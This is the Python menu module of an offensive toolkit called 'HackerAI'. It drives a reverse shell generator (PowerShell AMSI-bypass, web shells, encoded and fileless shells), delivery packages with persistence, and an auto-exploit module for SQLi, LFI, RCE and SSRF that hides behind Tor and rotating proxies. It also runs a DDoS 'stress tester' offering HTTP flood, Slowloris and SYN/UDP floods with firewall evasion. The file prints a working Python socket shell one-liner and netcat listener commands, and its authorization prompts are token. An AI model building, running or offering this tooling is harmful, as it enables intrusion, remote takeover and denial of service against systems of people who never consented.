"""
HackerAI - Advanced Menu System
Updated for Async Stress Tester and New Features
"""
import asyncio
import time
import json
import os
import sys
from config import *
from proxy_manager import AdvancedProxyManager
from utils import clean, get_local_ip

class MenuSystem:
    def __init__(self):
        self.proxy_manager = AdvancedProxyManager()
        self.running = True
        self.current_version = "v3.0 ADVANCED"
        
    def display_banner(self):
        """Display enhanced banner"""
        clean()
        banner = f"""{R}
        ╔═╗┬  ┌─┐┌─┐┬─┐┌─┐  ╔═╗┬
        ╠═╝│  │ ││ │├┬┘├┤   ║  │
        ╩  ┴─┘└─┘└─┘┴└─└─┘  ╚═╝┴─┘
        {G}─────────────────────────────────────────{W}
        {C}Version: {self.current_version} | Async Engine Enabled{W}
        {Y}Ethical Hacking & Security Assessment Tool{W}
        {R}═════════════════════════════════════════{W}"""
        print(banner)
    
    def view_report_enhanced(self):
        """Enhanced report viewer with export options"""
        clean()
        self.display_banner()
        
        if not os.path.exists(REPORT_FILE):
            print(f"\n{Y}[!] No report file found.{W}")
            print(f"{C}[*] Reports are saved in: {REPORT_FILE}{W}")
            input(f"\n{Y}Press Enter to return...{W}")
            return
        
        try:
            with open(REPORT_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            print(f"\n{G}{'='*60}{W}")
            print(f"{C}           SCAN REPORT SUMMARY{W}")
            print(f"{G}{'='*60}{W}")
            
            if not data:
                print(f"{Y}[!] Report file is empty{W}")
                input(f"\n{Y}Press Enter to return...{W}")
                return
            
            total_targets = len(data)
            total_findings = 0
            finding_types = {}
            
            print(f"\n{Y}[+] Latest Scans:{W}")
            print(f"{C}{'-'*50}{W}")
            
            for idx, (target, scans) in enumerate(list(data.items())[-5:], 1):
                target_findings = sum(len(f) for f in scans.values())
                print(f"{G}{idx}. {target[:50]}{W}")
                print(f"   └─ Findings: {target_findings} | Scans: {len(scans)}")
                total_findings += target_findings
                
                for scan_type, findings in scans.items():
                    if scan_type not in finding_types:
                        finding_types[scan_type] = 0
                    finding_types[scan_type] += len(findings)
            
            print(f"\n{G}{'='*60}{W}")
            print(f"{C}[*] Statistics:{W}")
            print(f"{C}  Total targets scanned: {total_targets}{W}")
            print(f"{C}  Total findings: {total_findings}{W}")
            
            if finding_types:
                print(f"{C}  Finding types distribution:{W}")
                for ftype, count in finding_types.items():
                    percentage = (count / total_findings * 100) if total_findings > 0 else 0
                    bar = "█" * int(percentage / 5)
                    print(f"    {ftype:20} {count:4} {bar}")
            
            print(f"\n{Y}[?] Options:{W}")
            print(f"  {G}[1]{W} View detailed report for a target")
            print(f"  {G}[2]{W} Export report to text file")
            print(f"  {G}[3]{W} Export report to JSON")
            print(f"  {G}[4]{W} Clear all reports")
            print(f"  {G}[0]{W} Return to main menu")
            
            choice = input(f"\n{Y}Select option: {W}").strip()
            
            if choice == '1':
                self._view_detailed_report(data)
            elif choice == '2':
                self._export_report_txt(data)
            elif choice == '3':
                self._export_report_json(data)
            elif choice == '4':
                self._clear_reports(data)
        
        except json.JSONDecodeError:
            print(f"{R}[!] Error reading report file (invalid JSON){W}")
        except Exception as e:
            print(f"{R}[!] Error reading report: {e}{W}")
        
        input(f"\n{Y}Press Enter to return...{W}")
    
    def _view_detailed_report(self, data):
        """View detailed report for a specific target"""
        print(f"\n{Y}Available targets:{W}")
        targets = list(data.keys())
        for i, target in enumerate(targets, 1):
            print(f"  {G}[{i}]{W} {target[:60]}")
        
        try:
            choice = input(f"\n{Y}Select target (1-{len(targets)}): {W}").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(targets):
                target = targets[int(choice)-1]
                scans = data[target]
                
                print(f"\n{G}{'='*60}{W}")
                print(f"{C}Detailed Report for: {target}{W}")
                print(f"{G}{'='*60}{W}")
                
                for scan_type, findings in scans.items():
                    print(f"\n{Y}[+] {scan_type.upper()} ({len(findings)} findings){W}")
                    print(f"{C}{'-'*40}{W}")
                    
                    for i, finding in enumerate(findings[:10], 1):
                        print(f"\n{G}{i}.{W}")
                        for key, value in finding.items():
                            if isinstance(value, str):
                                if len(value) > 100:
                                    value = value[:100] + "..."
                            print(f"   {C}{key}:{W} {value}")
                        
                        if i >= 10 and len(findings) > 10:
                            print(f"\n{Y}[*] Showing 10 of {len(findings)} findings...{W}")
                            break
        except:
            pass
        
        input(f"\n{Y}Press Enter to continue...{W}")
    
    def _export_report_txt(self, data):
        """Export report to text file"""
        timestamp = int(time.time())
        export_file = f"report_export_{timestamp}.txt"
        
        try:
            with open(export_file, 'w', encoding='utf-8') as f:
                f.write("=" * 70 + "\n")
                f.write("HackerAI Security Scan Report\n")
                f.write(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 70 + "\n\n")
                
                for target, scans in data.items():
                    f.write(f"Target: {target}\n")
                    f.write("-" * 50 + "\n")
                    
                    for scan_type, findings in scans.items():
                        f.write(f"\n{scan_type.upper()} ({len(findings)} findings):\n")
                        f.write("~" * 40 + "\n")
                        
                        for i, finding in enumerate(findings, 1):
                            f.write(f"\n{i}. ")
                            for key, value in finding.items():
                                if isinstance(value, str) and len(value) > 100:
                                    value = value[:100] + "..."
                                f.write(f"{key}: {value} | ")
                        
                        f.write("\n\n")
                    
                    f.write("=" * 70 + "\n\n")
            
            print(f"\n{G}[+] Report exported to: {export_file}{W}")
            print(f"{C}[*] Total size: {os.path.getsize(export_file)} bytes{W}")
            
        except Exception as e:
            print(f"{R}[!] Error exporting report: {e}{W}")
    
    def _export_report_json(self, data):
        """Export report to JSON file"""
        timestamp = int(time.time())
        export_file = f"report_export_{timestamp}.json"
        
        try:
            with open(export_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            print(f"\n{G}[+] JSON report exported to: {export_file}{W}")
            print(f"{C}[*] Total size: {os.path.getsize(export_file)} bytes{W}")
            
        except Exception as e:
            print(f"{R}[!] Error exporting JSON report: {e}{W}")
    
    def _clear_reports(self, data):
        """Clear all reports with confirmation"""
        print(f"\n{R}{'!'*60}{W}")
        print(f"{R}[!] WARNING: This will delete ALL scan reports!{W}")
        confirm = input(f"{Y}Type 'DELETE' to confirm: {W}").strip()
        
        if confirm == "DELETE":
            try:
                backup_file = f"report_backup_{int(time.time())}.json"
                with open(backup_file, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2)
                
                os.remove(REPORT_FILE)
                print(f"{G}[+] All reports cleared{W}")
                print(f"{C}[*] Backup saved to: {backup_file}{W}")
            except Exception as e:
                print(f"{R}[!] Error clearing reports: {e}{W}")
        else:
            print(f"{Y}[*] Operation cancelled{W}")
        
        input(f"\n{Y}Press Enter to continue...{W}")
    
    def reverse_shell_generator_advanced(self):
        """Advanced reverse shell generator"""
        clean()
        self.display_banner()
        
        print(f"\n{G}{'='*60}{W}")
        print(f"{C}           ADVANCED REVERSE SHELL GENERATOR{W}")
        print(f"{G}{'='*60}{W}")
        
        global LHOST, LPORT
        current_lhost = LHOST
        current_lport = LPORT
        
        print(f"\n{Y}Current Settings:{W}")
        print(f"{C}LHOST: {W}{current_lhost}")
        print(f"{C}LPORT: {W}{current_lport}")
        
        print(f"\n{Y}Configure Settings (press Enter to keep current):{W}")
        new_lhost = input(f"{C}Enter LHOST [{current_lhost}]: {W}").strip()
        new_lport = input(f"{C}Enter LPORT [{current_lport}]: {W}").strip()
        
        if new_lhost:
            LHOST = new_lhost
            current_lhost = new_lhost
        if new_lport and new_lport.isdigit():
            LPORT = int(new_lport)
            current_lport = int(new_lport)
        
        try:
            from reverse_shell import AdvancedReverseShellGenerator
            gen = AdvancedReverseShellGenerator(current_lhost, current_lport)
        except ImportError:
            from reverse_shell import ReverseShellGenerator
            gen = ReverseShellGenerator(current_lhost, current_lport)
        
        print(f"\n{G}[*] Generating Reverse Shells...{W}")
        print(f"{Y}{'-'*60}{W}")
        
        shells = gen.generate_all()
        
        categories = {
            "Linux/Unix Shells": ["bash", "python", "python3", "perl", "nc", "socat", "awk", "telnet"],
            "Windows Shells": ["powershell", "cmd", "powershell_amsi", "powershell_encoded"],
            "Web Shells": ["php", "jsp", "asp"],
            "Database Shells": ["mysql", "postgresql"],
            "Encoded Shells": ["base64_encoded", "xor_encrypted"],
            "Advanced Shells": ["bash_fileless", "bash_sudo"]
        }
        
        for category, shell_list in categories.items():
            print(f"\n{BL}[ {category} ]{W}")
            print(f"{Y}{'-'*40}{W}")
            
            for name in shell_list:
                if name in shells:
                    print(f"\n{C}[{name.upper()}]{W}")
                    
                    # Display compact version
                    shell_text = shells[name]
                    if isinstance(shell_text, dict):
                        shell_text = shell_text.get('decoder', str(shell_text))
                    
                    if len(shell_text) > 80:
                        print(f"{G}{shell_text[:80]}...{W}")
                    else:
                        print(f"{G}{shell_text}{W}")
                    
                    # Show one-liner if available
                    try:
                        one_liners = gen.generate_one_liner(name)
                        if one_liners:
                            for enc_type, cmd in one_liners.items():
                                if enc_type != "original":
                                    print(f"  {M}[{enc_type}] {cmd[:60]}...{W}")
                    except:
                        pass
        
        # Save to file
        timestamp = int(time.time())
        save_file = f"reverse_shells_{timestamp}.txt"
        
        try:
            with open(save_file, 'w', encoding='utf-8') as f:
                f.write(f"{'='*60}\n")
                f.write(f"Reverse Shell Collection\n")
                f.write(f"Generated: {time.ctime()}\n")
                f.write(f"LHOST: {current_lhost}, LPORT: {current_lport}\n")
                f.write(f"{'='*60}\n\n")
                
                for category, shell_list in categories.items():
                    f.write(f"\n[{category}]\n")
                    f.write("-" * 40 + "\n")
                    
                    for name in shell_list:
                        if name in shells:
                            f.write(f"\n[{name.upper()}]\n")
                            shell_text = shells[name]
                            if isinstance(shell_text, dict):
                                shell_text = shell_text.get('decoder', str(shell_text))
                            f.write(f"{shell_text}\n")
                            
                            try:
                                one_liners = gen.generate_one_liner(name)
                                if one_liners:
                                    f.write("\nEncoded versions:\n")
                                    for enc_type, cmd in one_liners.items():
                                        if enc_type != "original":
                                            f.write(f"  [{enc_type}] {cmd}\n")
                            except:
                                pass
            
            print(f"\n{G}[+] Shells saved to: {save_file}{W}")
            
        except Exception as e:
            print(f"{R}[!] Error saving file: {e}{W}")
        
        # Quick listener setup
        print(f"\n{Y}[*] Quick Listener Commands:{W}")
        print(f"{C}{'-'*50}{W}")
        print(f"{G}Netcat:{W} nc -nlvp {current_lport}")
        print(f"{G}Socat:{W} socat file:`tty`,raw,echo=0 TCP-LISTEN:{current_lport}")
        print(f"{G}Python:{W} python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"\",{current_lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
        
        # Interactive handler option
        print(f"\n{Y}[*] Interactive Handler:{W}")
        print(f"{C}[1] Start interactive handler (background){W}")
        print(f"{C}[2] Generate delivery package{W}")
        print(f"{C}[3] Create web delivery server{W}")
        
        handler_choice = input(f"\n{Y}Select option (1-3 or Enter to skip): {W}").strip()
        
        if handler_choice == '1':
            try:
                if gen.start_interactive_handler(background=True):
                    print(f"{G}[+] Interactive handler started on port {current_lport}{W}")
                    print(f"{C}[*] Type 'sessions' in shell to view active connections{W}")
            except Exception as e:
                print(f"{R}[!] Failed to start handler: {e}{W}")
        
        elif handler_choice == '2':
            try:
                package = gen.generate_delivery_package('bash', include_persistence=True)
                if package:
                    package_file = f"delivery_package_{timestamp}.json"
                    with open(package_file, 'w') as f:
                        json.dump(package, f, indent=2)
                    print(f"{G}[+] Delivery package saved to: {package_file}{W}")
            except Exception as e:
                print(f"{R}[!] Failed to generate package: {e}{W}")
        
        elif handler_choice == '3':
            try:
                if gen.create_web_delivery('bash', port=8080):
                    print(f"{G}[+] Web delivery server started on port 8080{W}")
            except Exception as e:
                print(f"{R}[!] Failed to start web server: {e}{W}")
        
        input(f"\n{Y}Press Enter to return to menu...{W}")
    
    def auto_exploit_interface(self):
        """Auto-exploit interface with enhanced options"""
        clean()
        self.display_banner()
        
        print(f"\n{G}{'='*60}{W}")
        print(f"{C}           AUTO-EXPLOIT MODULE{W}")
        print(f"{G}{'='*60}{W}")
        
        target = input(f"\n{Y}Vulnerable URL (with http:// or https://): {W}").strip()
        
        if not target.startswith(('http://', 'https://')):
            print(f"{Y}[*] Adding http:// prefix{W}")
            target = 'http://' + target
        
        print(f"\n{C}[1] SQL Injection (SQLi){W}")
        print(f"{C}[2] LFI (Local File Inclusion){W}")
        print(f"{C}[3] XSS (Cross-Site Scripting){W}")
        print(f"{C}[4] Command Injection{W}")
        print(f"{C}[5] RCE (Remote Code Execution){W}")
        print(f"{C}[6] Path Traversal{W}")
        print(f"{C}[7] SSRF (Server-Side Request Forgery){W}")
        
        exp_type = input(f"\n{Y}Exploit type (1-7): {W}").strip()
        
        vuln_types = {
            '1': 'SQLi', '2': 'LFI', '3': 'XSS', '4': 'Command Injection',
            '5': 'RCE', '6': 'Path Traversal', '7': 'SSRF'
        }
        
        vuln_type = vuln_types.get(exp_type, 'SQLi')
        
        payload = input(f"{Y}Vulnerable parameter/value (e.g., id=1 or /etc/passwd): {W}").strip()
        
        if not payload:
            print(f"{R}[!] No payload provided{W}")
            input(f"\n{Y}Press Enter to return...{W}")
            return
        
        print(f"\n{Y}[?] Advanced Options:{W}")
        print(f"  {G}[1]{W} Use proxy rotation")
        print(f"  {G}[2]{W} Use Tor network")
        print(f"  {G}[3]{W} Use random user agents")
        print(f"  {G}[4]{W} Use delay between requests")
        print(f"  {G}[5]{W} Use all options")
        print(f"  {G}[0]{W} Default (no advanced options)")
        
        adv_choice = input(f"\n{Y}Select option: {W}").strip()
        
        use_proxy = adv_choice in ['1', '5']
        use_tor = adv_choice in ['2', '5']
        use_random_ua = adv_choice in ['3', '5']
        use_delay = adv_choice in ['4', '5']
        
        if use_proxy:
            print(f"{C}[*] Enabling proxy rotation{W}")
            self.proxy_manager.toggle_proxy_rotation()
        
        if use_tor:
            print(f"{C}[*] Enabling Tor network{W}")
            self.proxy_manager.toggle_tor()
        
        try:
            from auto_exploit import AdvancedAutoExploit
            exploit = AdvancedAutoExploit(
                target_url=target, 
                vuln_type=vuln_type, 
                payload=payload, 
                proxy_manager=self.proxy_manager if use_proxy else None,
                random_user_agent=use_random_ua,
                delay=0.5 if use_delay else 0,
                obfuscation_level="medium"
            )
            
            print(f"\n{Y}[*] Starting exploitation...{W}")
            result = exploit.run_exploit()
            
        except ImportError as e:
            print(f"{R}[!] Error importing AdvancedAutoExploit: {e}{W}")
            # Fallback to legacy version
            try:
                from auto_exploit import AutoExploit
                exploit = AutoExploit(
                    target_url=target, 
                    vuln_type=vuln_type, 
                    payload=payload, 
                    proxy_manager=self.proxy_manager if use_proxy else None
                )
                print(f"\n{Y}[*] Starting exploitation (legacy mode)...{W}")
                result = exploit.run_exploit()
            except ImportError as e2:
                print(f"{R}[!] Failed to load any exploit module: {e2}{W}")
                result = {"success": False, "error": "Module import failed"}
        
        # Cleanup
        if use_proxy and self.proxy_manager.use_proxy_rotation:
            self.proxy_manager.toggle_proxy_rotation()
        if use_tor and self.proxy_manager.use_tor:
            self.proxy_manager.toggle_tor()
        
        # Display results
        if result.get('success'):
            print(f"\n{G}[+] Exploitation successful!{W}")
            if 'results' in result:
                print(f"{C}[*] Type: {result.get('type', 'Unknown')}{W}")
                if 'os' in result.get('results', {}):
                    print(f"{C}[*] OS Detected: {result['results']['os']}{W}")
                if 'files' in result.get('results', {}):
                    print(f"{C}[*] Files extracted: {len(result['results']['files'])}{W}")
        else:
            print(f"\n{R}[-] Exploitation failed{W}")
            if 'error' in result:
                print(f"{Y}[*] Error: {result['error']}{W}")
        
        input(f"\n{Y}Press Enter to return...{W}")
    
    def settings_menu(self):
        """Enhanced settings menu"""
        while True:
            clean()
            self.display_banner()
            
            global THREADS, LHOST, LPORT, TIMEOUT
            
            proxy_status = f"{G}ON{W}" if self.proxy_manager.use_proxy_rotation else f"{R}OFF{W}"
            tor_status = f"{G}ON{W}" if self.proxy_manager.use_tor else f"{R}OFF{W}"
            stealth_status = f"{G}ON{W}" if self.proxy_manager.stealth_mode else f"{R}OFF{W}"
            
            print(f"\n{G}{'='*60}{W}")
            print(f"{C}           SETTINGS MENU{W}")
            print(f"{G}{'='*60}{W}")
            
            print(f"\n{C}[1] Network Settings{W}")
            print(f"    ├─ Proxy Rotation: {proxy_status}")
            print(f"    ├─ Tor Network: {tor_status}")
            print(f"    ├─ Stealth Mode: {stealth_status}")
            print(f"    ├─ Threads: {THREADS}")
            print(f"    └─ Timeout: {TIMEOUT}s")
            
            print(f"\n{C}[2] Reverse Shell Settings{W}")
            print(f"    ├─ LHOST: {LHOST}")
            print(f"    └─ LPORT: {LPORT}")
            
            print(f"\n{C}[3] Proxy Management{W}")
            print(f"    ├─ Refresh proxy list")
            print(f"    ├─ View active proxies")
            print(f"    ├─ Test proxy anonymity")
            print(f"    └─ View proxy stats")
            
            print(f"\n{C}[4] Tool Configuration{W}")
            print(f"    ├─ Default scan depth: 3")
            print(f"    ├─ Report auto-save: ON")
            print(f"    └─ Color scheme: ENABLED")
            
            print(f"\n{C}[0] Back to Main Menu{W}")
            
            choice = input(f"\n{Y}Select option: {W}").strip()
            
            if choice == '1':
                self._network_settings()
            elif choice == '2':
                self._shell_settings()
            elif choice == '3':
                self._proxy_management()
            elif choice == '4':
                self._tool_configuration()
            elif choice == '0':
                break
    
    def _network_settings(self):
        """Network settings submenu"""
        clean()
        global THREADS, TIMEOUT
        
        print(f"\n{G}{'='*60}{W}")
        print(f"{C}           NETWORK SETTINGS{W}")
        print(f"{G}{'='*60}{W}")
        
        print(f"\n{C}[1] Toggle Proxy Rotation (Current: {self.proxy_manager.use_proxy_rotation}){W}")
        print(f"{C}[2] Toggle Tor Network (Current: {self.proxy_manager.use_tor}){W}")
        print(f"{C}[3] Toggle Stealth Mode (Current: {self.proxy_manager.stealth_mode}){W}")
        print(f"{C}[4] Set Thread Count (Current: {THREADS}){W}")
        print(f"{C}[5] Set Timeout (Current: {TIMEOUT}s){W}")
        print(f"{C}[6] Set Custom Proxy List{W}")
        print(f"{C}[0] Back{W}")
        
        choice = input(f"\n{Y}Select option: {W}").strip()
        
        if choice == '1':
            self.proxy_manager.toggle_proxy_rotation()
            status = "ON" if self.proxy_manager.use_proxy_rotation else "OFF"
            print(f"{G}[+] Proxy rotation is now {status}{W}")
            time.sleep(1)
        elif choice == '2':
            self.proxy_manager.toggle_tor()
            status = "ON" if self.proxy_manager.use_tor else "OFF"
            print(f"{G}[+] Tor network is now {status}{W}")
            time.sleep(1)
        elif choice == '3':
            self.proxy_manager.toggle_stealth_mode()
            status = "ON" if self.proxy_manager.stealth_mode else "OFF"
            print(f"{G}[+] Stealth mode is now {status}{W}")
            time.sleep(1)
        elif choice == '4':
            new_threads = input(f"{C}Enter thread count [{THREADS}]: {W}").strip()
            if new_threads.isdigit():
                THREADS = int(new_threads)
                print(f"{G}[+] Threads set to: {THREADS}{W}")
                time.sleep(1)
        elif choice == '5':
            new_timeout = input(f"{C}Enter timeout in seconds [{TIMEOUT}]: {W}").strip()
            if new_timeout.isdigit():
                TIMEOUT = int(new_timeout)
                print(f"{G}[+] Timeout set to: {TIMEOUT}s{W}")
                time.sleep(1)
        elif choice == '6':
            proxy_list = input(f"{C}Enter proxy list (comma-separated): {W}").strip()
            if proxy_list:
                proxies = [p.strip() for p in proxy_list.split(',')]
                self.proxy_manager.proxies = proxies
                print(f"{G}[+] Added {len(proxies)} proxies to list{W}")
                time.sleep(1)
    
    def _shell_settings(self):
        """Reverse shell settings"""
        clean()
        global LHOST, LPORT
        
        print(f"\n{G}{'='*60}{W}")
        print(f"{C}           REVERSE SHELL SETTINGS{W}")
        print(f"{G}{'='*60}{W}")
        
        print(f"\n{C}[1] Set LHOST (Current: {LHOST}){W}")
        print(f"{C}[2] Set LPORT (Current: {LPORT}){W}")
        print(f"{C}[3] Auto-detect local IP{W}")
        print(f"{C}[4] Test listener setup{W}")
        print(f"{C}[0] Back{W}")
        
        choice = input(f"\n{Y}Select option: {W}").strip()
        
        if choice == '1':
            new_lhost = input(f"{C}Enter LHOST [{LHOST}]: {W}").strip()
            if new_lhost:
                LHOST = new_lhost
                print(f"{G}[+] LHOST set to: {LHOST}{W}")
                time.sleep(1)
        elif choice == '2':
            new_lport = input(f"{C}Enter LPORT [{LPORT}]: {W}").strip()
            if new_lport.isdigit():
                LPORT = int(new_lport)
                print(f"{G}[+] LPORT set to: {LPORT}{W}")
                time.sleep(1)
        elif choice == '3':
            local_ip = get_local_ip()
            if local_ip:
                LHOST = local_ip
                print(f"{G}[+] Auto-detected local IP: {local_ip}{W}")
                print(f"{C}[*] LHOST updated to: {LHOST}{W}")
            else:
                print(f"{R}[!] Could not detect local IP{W}")
            time.sleep(2)
        elif choice == '4':
            print(f"\n{Y}[*] Testing listener setup...{W}")
            print(f"{C}LHOST: {LHOST}{W}")
            print(f"{C}LPORT: {LPORT}{W}")
            print(f"{G}[+] Test commands:{W}")
            print(f"  nc -nlvp {LPORT}")
            print(f"  python3 -m http.server {LPORT}")
            input(f"\n{Y}Press Enter to continue...{W}")
    
    def _proxy_management(self):
        """Proxy management"""
        while True:
            clean()
            
            print(f"\n{G}{'='*60}{W}")
            print(f"{C}           PROXY MANAGEMENT{W}")
            print(f"{G}{'='*60}{W}")
            
            print(f"\n{C}[1] Refresh proxy list (fetch new proxies){W}")
            print(f"{C}[2] View active proxy list{W}")
            print(f"{C}[3] Test proxy anonymity{W}")
            print(f"{C}[4] View proxy statistics{W}")
            print(f"{C}[5] Clear proxy list{W}")
            print(f"{C}[6] Rotate Tor identity{W}")
            print(f"{C}[0] Back{W}")
            
            choice = input(f"\n{Y}Select option: {W}").strip()
            
            if choice == '1':
                print(f"{C}[*] Fetching fresh proxy list...{W}")
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(self.proxy_manager.fetch_proxies_async())
                print(f"{G}[+] Proxy list updated{W}")
                time.sleep(1)
            elif choice == '2':
                if self.proxy_manager.verified_proxies:
                    print(f"\n{Y}Verified Proxies ({len(self.proxy_manager.verified_proxies)}):{W}")
                    for i, proxy_info in enumerate(self.proxy_manager.verified_proxies[:10], 1):
                        proxy = proxy_info.get('proxy', 'N/A')
                        speed = proxy_info.get('speed', 0)
                        print(f"  {G}[{i}]{W} {proxy} (Speed: {speed}ms)")
                    if len(self.proxy_manager.verified_proxies) > 10:
                        print(f"  ... and {len(self.proxy_manager.verified_proxies) - 10} more")
                else:
                    print(f"{Y}[!] No verified proxies in list{W}")
                input(f"\n{Y}Press Enter to continue...{W}")
            elif choice == '3':
                print(f"{C}[*] Testing proxy anonymity...{W}")
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                proxy = self.proxy_manager.get_proxy()
                if proxy:
                    loop.run_until_complete(self.proxy_manager.test_proxy_anonymity(proxy))
                else:
                    print(f"{R}[!] No proxy available for testing{W}")
                input(f"\n{Y}Press Enter to continue...{W}")
            elif choice == '4':
                stats = self.proxy_manager.get_stats()
                print(f"\n{Y}[*] Proxy Statistics:{W}")
                print(f"{C}Total Proxies: {stats['total_proxies']}{W}")
                print(f"{C}Verified Proxies: {stats['verified_proxies']}{W}")
                print(f"{C}Failed Proxies: {stats['failed_proxies']}{W}")
                print(f"{C}User Agents: {stats['user_agents']}{W}")
                print(f"{C}Proxy Switches: {stats['statistics']['proxy_switches']}{W}")
                print(f"{C}UA Rotations: {stats['statistics']['ua_rotations']}{W}")
                input(f"\n{Y}Press Enter to continue...{W}")
            elif choice == '5':
                confirm = input(f"{R}Clear all proxies? (y/N): {W}").strip().lower()
                if confirm == 'y':
                    self.proxy_manager.proxies = []
                    self.proxy_manager.verified_proxies = []
                    print(f"{G}[+] Proxy list cleared{W}")
                time.sleep(1)
            elif choice == '6':
                if self.proxy_manager.use_tor:
                    if self.proxy_manager.rotate_tor_identity():
                        print(f"{G}[+] Tor identity rotated{W}")
                    else:
                        print(f"{R}[!] Failed to rotate Tor identity{W}")
                else:
                    print(f"{Y}[!] Tor is not enabled{W}")
                time.sleep(1)
            elif choice == '0':
                break
    
    def _tool_configuration(self):
        """Tool configuration"""
        print(f"\n{G}{'='*60}{W}")
        print(f"{C}           TOOL CONFIGURATION{W}")
        print(f"{G}{'='*60}{W}")
        
        print(f"\n{Y}Configuration Options:{W}")
        print(f"  {C}[1]{W} Toggle auto-save reports")
        print(f"  {C}[2]{W} Set default scan depth")
        print(f"  {C}[3]{W} Toggle color scheme")
        print(f"  {C}[4]{W} Set output verbosity")
        print(f"  {C}[0]{W} Back")
        
        choice = input(f"\n{Y}Select option: {W}").strip()
        
        if choice == '3':
            print(f"\n{Y}[*] Color scheme can be modified in config.py{W}")
            print(f"{C}[*] Look for these variables:{W}")
            print(f"  R = '\\033[91m'  # Red")
            print(f"  G = '\\033[92m'  # Green")
            print(f"  Y = '\\033[93m'  # Yellow")
            input(f"\n{Y}Press Enter to continue...{W}")
    
    def stress_test_advanced_async(self):
        """Async stress test interface - UPDATED VERSION"""
        clean()
        self.display_banner()
        
        print(f"\n{R}{'!'*60}{W}")
        print(f"{R}[!] WARNING: For Authorized Stress Testing Only!{W}")
        print(f"{R}{'!'*60}{W}\n")
        
        confirm = input(f"{Y}Do you understand and accept responsibility? (y/N): {W}").strip().lower()
        if confirm != 'y':
            print(f"{R}[*] Operation cancelled.{W}")
            time.sleep(2)
            return
        
        target = input(f"{Y}Target URL (with http:// or https://): {W}").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        duration_input = input(f"{C}Duration in seconds (default 30): {W}").strip()
        duration = int(duration_input) if duration_input.isdigit() else 30
        
        concurrency_input = input(f"{C}Concurrency level (default 1000): {W}").strip()
        concurrency = int(concurrency_input) if concurrency_input.isdigit() else 1000
        
        print(f"\n{Y}Select Attack Strategy:{W}")
        print(f"  {G}[1]{W} HTTP Flood (Fast application layer attack)")
        print(f"  {G}[2]{W} Slowloris Attack (Connection exhaustion)")
        print(f"  {G}[3]{W} Mixed Attack (HTTP + Slowloris)")
        print(f"  {G}[4]{W} Intelligent Attack (HTTP/1.1 + HTTP/2 + Cache busting)")
        print(f"  {G}[5]{W} Distributed Attack (Multi-source simulation)")
        print(f"  {G}[6]{W} Smart Adaptive Attack (Auto-adjusts based on target)")
        print(f"  {G}[7]{W} Fragmented Attack (Firewall evasion)")
        print(f"  {G}[8]{W} Layer 4 Attack (SYN/UDP flood)")
        
        mode = input(f"\n{Y}Select attack type (1-8): {W}").strip()
        
        attack_types = {
            '1': 'http',
            '2': 'slowloris', 
            '3': 'mixed',
            '4': 'intelligent',
            '5': 'distributed',
            '6': 'adaptive',
            '7': 'fragmented',
            '8': 'layer4'
        }
        
        attack_type = attack_types.get(mode, 'mixed')
        
        # For distributed attack, configure nodes
        distributed_nodes = []
        if attack_type == 'distributed':
            print(f"\n{Y}Distributed Attack Configuration:{W}")
            print(f"{C}[1] Simulate 3 distributed nodes (default){W}")
            print(f"{C}[2] Enter custom node IPs{W}")
            node_choice = input(f"\n{Y}Select option: {W}").strip()
            
            if node_choice == '2':
                nodes_input = input(f"{C}Enter node IPs (comma-separated): {W}").strip()
                if nodes_input:
                    for ip in nodes_input.split(','):
                        distributed_nodes.append({
                            'ip': ip.strip(),
                            'location': 'Custom',
                            'status': 'active'
                        })
            else:
                # Simulate nodes
                distributed_nodes = [
                    {'ip': '192.168.1.100', 'location': 'US-East', 'status': 'active'},
                    {'ip': '192.168.1.101', 'location': 'EU-West', 'status': 'active'},
                    {'ip': '192.168.1.102', 'location': 'Asia-Pacific', 'status': 'active'}
                ]
        
        # Ask for fragmentation
        fragment_packets = False
        if attack_type in ['fragmented', 'mixed', 'layer4']:
            fragment_choice = input(f"{Y}Enable packet fragmentation? (y/N): {W}").strip().lower()
            fragment_packets = fragment_choice == 'y'
        
        # Ask for proxy usage
        print(f"\n{Y}[?] Use proxy rotation during attack? (y/n): {W}", end='')
        use_proxy = input().strip().lower() == 'y'
        
        proxy_manager = self.proxy_manager if use_proxy else None
        if use_proxy:
            print(f"{C}[*] Enabling proxy rotation{W}")
            self.proxy_manager.toggle_proxy_rotation()
        
        # Custom HTTP methods
        custom_methods = None
        if attack_type in ['http', 'mixed', 'intelligent']:
            methods_input = input(f"{Y}Custom HTTP methods (comma-separated, Enter for default): {W}").strip()
            if methods_input:
                custom_methods = [m.strip().upper() for m in methods_input.split(',')]
            else:
                custom_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        
        # Run the async attack
        try:
            from stress_tester import AdvancedAsyncStressTester
            
            print(f"\n{G}{'='*60}{W}")
            print(f"{C}Starting {attack_type.upper()} Attack{W}")
            print(f"{G}{'='*60}{W}")
            
            tester = AdvancedAsyncStressTester(
                target=target,
                duration=duration,
                concurrency=concurrency,
                attack_type=attack_type,
                proxy_manager=proxy_manager,
                distributed_nodes=distributed_nodes,
                fragment_packets=fragment_packets,
                custom_http_methods=custom_methods
            )
            
            asyncio.run(tester.run_async_attack())
            
        except ImportError as e:
            print(f"{R}[!] Error importing AdvancedAsyncStressTester: {e}{W}")
            # Fallback to old version
            try:
                print(f"{Y}[*] Using legacy stress tester{W}")
                from stress_tester import StressTester
                StressTester.run_stress_test(target, duration, concurrency, attack_type, proxy_manager)
            except ImportError as e2:
                print(f"{R}[!] Failed to load any stress tester module: {e2}{W}")
        except KeyboardInterrupt:
            print(f"\n{Y}[*] Attack interrupted by user.{W}")
        except Exception as e:
            print(f"{R}[!] Error during attack: {e}{W}")
            import traceback
            traceback.print_exc()
        
        # Cleanup
        if use_proxy and self.proxy_manager.use_proxy_rotation:
            self.proxy_manager.toggle_proxy_rotation()
        
        input(f"\n{Y}Press Enter to return to menu...{W}")
